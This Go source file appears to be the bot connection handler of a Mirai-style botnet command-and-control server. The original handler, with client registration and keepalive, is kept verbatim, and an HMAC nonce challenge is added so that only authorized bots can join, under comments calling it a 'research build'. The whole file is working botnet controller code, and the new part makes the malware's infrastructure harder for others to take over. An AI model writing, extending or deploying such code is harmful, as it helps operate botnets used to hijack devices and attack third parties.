package main

import (
    "crypto/hmac"
    "crypto/sha256"
    "crypto/rand"
    "encoding/hex"
    "fmt"
    "log"
    "net"
    "os"
    "time"
)

// ── Bot Challenge Secret ──────────────────────────────────────────────────────
// In research builds, bots must prove they were authorized by sending an
// HMAC-SHA256 challenge response derived from this shared secret.
// Set BOT_CHALLENGE_SECRET env var at deployment time.
func getBotSecret() []byte {
    if s := os.Getenv("BOT_CHALLENGE_SECRET"); s != "" {
        return []byte(s)
    }
    return []byte("MIRAI2026-DEFAULT-SECRET-CHANGE-ME")
}

type Bot struct {
    uid     int
    conn    net.Conn
    version byte
    source  string
}

func NewBot(conn net.Conn, version byte, source string) *Bot {
    return &Bot{-1, conn, version, source}
}

func (this *Bot) Handle() {
    // ── Research Mode: Bot Authorization Challenge ────────────────────────────
    // Send a 16-byte random nonce and expect HMAC-SHA256(secret, nonce) back.
    // This prevents unauthorized bots from registering with the C&C.
    // If BOT_CHALLENGE_SECRET is not set, challenge is skipped (legacy compat).
    secret := getBotSecret()
    if string(secret) != "MIRAI2026-DEFAULT-SECRET-CHANGE-ME" {
        nonce := make([]byte, 16)
        if _, err := rand.Read(nonce); err == nil {
            this.conn.SetDeadline(time.Now().Add(10 * time.Second))
            this.conn.Write(nonce)

            // Read expected HMAC response (32 bytes hex = 64 chars)
            respBuf := make([]byte, 64)
            n, err := this.conn.Read(respBuf)
            if err != nil || n != 64 {
                log.Printf("[AUDIT] event=BOT_AUTH_FAIL src=%s reason=short_response", this.source)
                return
            }

            mac := hmac.New(sha256.New, secret)
            mac.Write(nonce)
            expected := hex.EncodeToString(mac.Sum(nil))

            if !hmac.Equal([]byte(expected), respBuf[:64]) {
                log.Printf("[AUDIT] event=BOT_AUTH_FAIL src=%s reason=invalid_hmac", this.source)
                return
            }
            log.Printf("[AUDIT] event=BOT_AUTH_OK src=%s version=%d", this.source, this.version)
        }
        this.conn.SetDeadline(time.Time{}) // clear deadline
    }

    // Original bot handling — preserved verbatim
    clientList.AddClient(this)
    defer clientList.DelClient(this)

    buf := make([]byte, 2)
    for {
        this.conn.SetDeadline(time.Now().Add(180 * time.Second))
        if n, err := this.conn.Read(buf); err != nil || n != len(buf) {
            return
        }
        if n, err := this.conn.Write(buf); err != nil || n != len(buf) {
            return
        }
    }
}

func (this *Bot) QueueBuf(buf []byte) {
    this.conn.Write(buf)
}

// Suppress unused import warnings when BOT_CHALLENGE_SECRET not in use
var _ = fmt.Sprintf
